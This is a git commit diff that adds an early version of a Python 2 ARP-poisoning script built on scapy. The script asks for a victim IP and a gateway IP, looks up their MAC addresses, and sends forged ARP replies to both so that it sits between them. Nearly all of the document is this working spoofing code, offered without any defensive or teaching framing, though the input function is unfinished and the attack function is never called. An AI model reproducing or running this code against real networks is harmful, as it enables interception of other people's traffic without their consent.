2c0e42c7c1eb690ed7f75d3c1e5f2f0102c2a9b9
root <root@localhost.localdomain>
2018-02-07 09:02:38 -0500

    V2

--- arp-poisoning.py
+++ arp-poisoning.py
@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
+
 #################################################
 #Auteur: Vikrant SINGH                          #
 #Programme: ARP Poisoning                       #
@@ -13,8 +14,25 @@
 
 from Tkinter import *
 from scapy.all import *
-
+import sys
 #################################################
 
-print "hello"
+def information () :
+	interface = raw_input("interface réseau :")
+	ipvictime = raw_input("IP de la victime:")
+	iprouteur = raw_input("IP du routeur GW :")
+
+
+def mac_victime(ip):
+    ans, unans = arping(ip)
+    for s, r in ans:
+        return r[Ether].src
+
+
+def poison(iprouteur, ipvictime):
+    victimMAC = mac_victime(ipvictime)
+    routerMAC = mac_victime(iprouteur)
+    send(ARP(op =2, pdst = ipvictime, psrc = iprouteur, hwdst = victimMAC))
+    send(ARP(op = 2, pdst = iprouteur, psrc = ipvictime, hwdst = routerMAC))
+
 
